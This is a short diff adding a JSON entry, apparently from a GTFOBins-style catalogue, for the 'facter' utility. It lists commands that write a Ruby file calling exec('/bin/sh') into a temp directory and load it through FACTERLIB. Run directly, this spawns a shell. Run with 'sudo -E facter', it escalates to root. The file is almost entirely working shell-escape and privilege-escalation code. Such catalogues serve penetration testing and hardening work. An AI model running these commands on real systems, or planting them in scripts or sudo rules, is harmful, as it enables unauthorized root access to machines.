@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF facter\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nFACTERLIB=$TF sudo -E facter\n"
+      }
+    ]
+  }
+}
